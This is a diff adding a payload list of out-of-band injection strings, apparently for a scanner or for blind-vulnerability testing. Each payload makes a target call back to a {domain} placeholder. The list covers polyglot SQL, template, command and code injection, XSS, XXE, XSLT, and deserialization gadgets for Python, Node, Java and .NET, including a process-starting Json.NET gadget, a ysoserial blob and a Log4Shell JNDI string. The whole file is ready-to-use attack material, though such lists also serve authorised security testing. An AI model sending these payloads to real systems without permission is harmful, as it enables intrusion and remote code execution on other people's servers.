@@ -1,0 +1,36 @@
+##POLYGLOT - SQLi Cross-Dialect (OOB)##
+';EXEC master..xp_dirtree '\\{domain}\a'--/*'OR LOAD_FILE('\\\\{domain}\\a')OR'*/"OR(SELECT dblink_send_query('host={domain}','SELECT 1'))--
+##POLYGLOT - SSTI Cross-Engine (OOB)##
+{{__import__('urllib.request').request.urlopen('http://{domain}/ssti')}}${T(java.net.URL).new('http://{domain}/ssti').openStream()}<%= require('net/http');Net::HTTP.get(URI('http://{domain}/ssti')) %>
+##POLYGLOT - OS Command Injection Cross-Shell (OOB)##
+;nslookup {domain} #'|nslookup {domain}|"$(nslookup {domain})`nslookup {domain}`
+##POLYGLOT - Code Injection Cross-Language (OOB)##
+__import__('urllib.request').request.urlopen('http://{domain}/pyeval')
+##POLYGLOT - XSS Blind/OOB##
+'"><script src=//{domain}/x.js></script><img src=//{domain}/x onerror=alert(1337)><!--
+##POLYGLOT - XXE (OOB)##
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{domain}/xxe">]><foo>&xxe;</foo>
+##XSLT Injection - OOB##
+<xsl:value-of select="document('http://{domain}/xslt')"/>
+##Groovy Code Injection - OOB##
+new URL('http://{domain}/groovy').text
+##Python Pickle P0 - OOB urllib##
+Y19fYnVpbHRpbl9fCmV2YWwKKFMnX19pbXBvcnRfXygidXJsbGliLnJlcXVlc3QiKS5yZXF1ZXN0LnVybG9wZW4oImh0dHA6Ly97ZG9tYWlufS9waWNrbGUiKScKdFIu
+##Python YAML - OOB urllib##
+!!python/object/apply:builtins.exec ["import urllib.request;urllib.request.urlopen('http://{domain}/yaml')"]
+##Python jsonpickle - OOB urllib##
+{"py/reduce":[{"py/function":"builtins.eval"},{"py/tuple":["__import__('urllib.request').request.urlopen('http://{domain}/jsonpickle')"]}]}
+##Node node-serialize - OOB http.get##
+{"rce":"_$$ND_FUNC$$_function(){require('http').get('http://{domain}/nodeser')}()"}
+##Java Fastjson - OOB (InetAddress DNS)##
+{"@type":"java.net.InetAddress","val":"{domain}"}
+##XMLDecoder - OOB URL.openStream##
+<java version="1.8.0" class="java.beans.XMLDecoder"><object class="java.net.URL"><string>http://{domain}/xmldecoder</string><void method="openStream"/></object></java>
+##Java Hessian - OOB (JNDI ref)##
+C_hessianRldap://{domain}/a
+##.NET Json.NET - OOB (nslookup)##
+{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System","FileName":"nslookup","Arguments":"{domain}"}}}
+##ysoserial URLDNS - OOB (DNS lookup)##
+rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHA/QAAAAAAADHcIAAAAEAAAAAFzcgAMamF2YS5uZXQuVVJMliU3Nhr85HIDAAdJAAhoYXNoQ29kZUkABHBvcnRMAAlhdXRob3JpdHl0ABJMamF2YS9sYW5nL1N0cmluZztMAARmaWxldAASTGphdmEvbGFuZy9TdHJpbmc7TAAEaG9zdHQAEkxqYXZhL2xhbmcvU3RyaW5nO0wACHByb3RvY29sdAASTGphdmEvbGFuZy9TdHJpbmc7TAADcmVmdAASTGphdmEvbGFuZy9TdHJpbmc7cP//////////dAAIe2RvbWFpbn10AAcvdXJsZG5zdAAIe2RvbWFpbn10AARodHRwcHh0ABZodHRwOi8ve2RvbWFpbn0vdXJsZG5zeA==
+##Java JNDI - OOB ldap##
+${jndi:ldap://{domain}/a}
